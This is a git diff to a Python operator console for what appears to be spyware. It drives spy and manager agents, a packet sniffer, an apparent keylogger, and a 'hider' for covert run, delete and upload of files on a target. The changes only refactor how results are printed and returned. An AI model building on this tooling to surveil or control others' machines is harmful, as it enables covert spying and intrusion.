@@ -1,9 +1,11 @@
 from agent import Agent
+from responce import Responce
 from operation import Operation
 from contParams import *
 from funCode import FunCode
 import tabulate
 from icecream import ic
+from status import Status
 from random import randint
 import time
 
@@ -21,6 +23,16 @@ $ sniff 30
 def LOG(s: str):
     print(f"LOG: {s}")
 
+def print_res_str(res: tuple[Responce, bytes]):
+    if type(res[0]) == tuple:
+        res = res[0]
+    stat = res[0].status
+    stri = res[1]
+    if type(stri) == bytes:
+        stri = stri.decode()
+    if stat != Status.SUCCSESS and stat != Status.DID_NOTHING or stri != '':
+        print(f'Status: {stat}')
+        print(f'String Response:\n---------------\n{stri}')    
 
 class Context:
     def __init__(self, operations):
@@ -125,7 +137,7 @@ class UI:
         """
         if self.is_op_active():
             res = call_method(self.ctx.selected_operation.spyAgent, method, *args)
-            print(res)
+            print_res_str(res)
             return res
 
     def manager(self, method, *args):
@@ -136,7 +148,7 @@ class UI:
         """
         if self.is_op_active():
             res = call_method(self.ctx.selected_operation.managerAgent, method, *args)
-            print(res)
+            print_res_str(res)
             return res
 
     def ops(self):
@@ -265,11 +277,10 @@ class UI:
                 return
         net_driver = self.ctx.selected_operation.netDriver
         params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
-        print(
-            self.ctx.selected_operation.spyAgent.runContraption(
+        res = self.ctx.selected_operation.spyAgent.runContraption(
                 params, self.ctx.cont_ident
-            )
         )
+        print_res_str(res)
         self.ctx.cont_ident += 1
 
     def kligger(self, time):
@@ -292,11 +303,10 @@ class UI:
         ic(kligPar)
         kligP = ContParams(KligerType, kligPar)
         ic(kligP)
-        print(
-            self.ctx.selected_operation.spyAgent.runContraption(
+        res = self.ctx.selected_operation.spyAgent.runContraption(
                 kligP, self.ctx.cont_ident
             )
-        )
+        print_res_str(res)
         self.ctx.cont_ident += 1
 
     def setup(self, targetPath, imagePath, mountPath):
@@ -310,16 +320,16 @@ class UI:
         """
         if not self.is_op_active():
             return
-        print(
-            self.ctx.selected_operation.managerAgent.hider_setup(
+        res = self.ctx.selected_operation.managerAgent.hider_setup(
                 targetPath, imagePath, mountPath
             )
-        )
+        print_res_str(res)
         LOG(f"Manager hider set")
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
-        print(spy.hider_setup(targetPath, imagePath, mountPath))
+        res = spy.hider_setup(targetPath, imagePath, mountPath)
+        print_res_str(res)
         LOG(f"Spyware hider set")
 
     def check_ready(self):
@@ -345,7 +355,8 @@ class UI:
                 FunCode.HIDDEN_RUN,
                 targetPath,
             )
-            print(res)
+            print_res_str(res)
+            return res
 
     def delete(self, targetPath):
         """
@@ -362,7 +373,8 @@ class UI:
                 FunCode.HIDDEN_DELETE,
                 targetPath,
             )
-            print(res)
+            print_res_str(res)
+            return res
 
     def rundel(self, targetPath):
         """
@@ -403,11 +415,13 @@ class UI:
             Status
         """
         if self.check_ready():
-            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
-                FunCode.HIDDEN_LIST,
-                "",
-            )
-            print(res)
+            res = self.ctx.selected_operation.managerAgent.list_files()
+            # res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
+            #     FunCode.HIDDEN_LIST,
+            #     "",
+            # )
+            print_res_str(res)
+            return res
 
     def uprun(self, homePath, targetPath):
         """
@@ -426,7 +440,8 @@ class UI:
                 homePath,
                 targetPath,
             )
-            print(res)
+            print_res_str(res)
+            return res
 
     def upload(self, homePath, targetPath):
         """
@@ -441,13 +456,13 @@ class UI:
             result of the upload
         """
         if self.check_ready():
-            print(
-                self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
+            res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                     FunCode.HIDDEN_UPLOAD,
                     homePath,
                     targetPath,
                 )
-            )
+            print_res_str(res)
+            return res
 
     def lazy(self):
         """
@@ -464,7 +479,7 @@ class UI:
         self.uprun(spyHome, spyTarget)
         time.sleep(3)
         self.setup(hiderTarg, 'f', 'f')
-        print('Done. Your turn.')
+        print('Done.')
 
     def list_ops_names(self):
         for op in self.ctx.oper_dict.values():
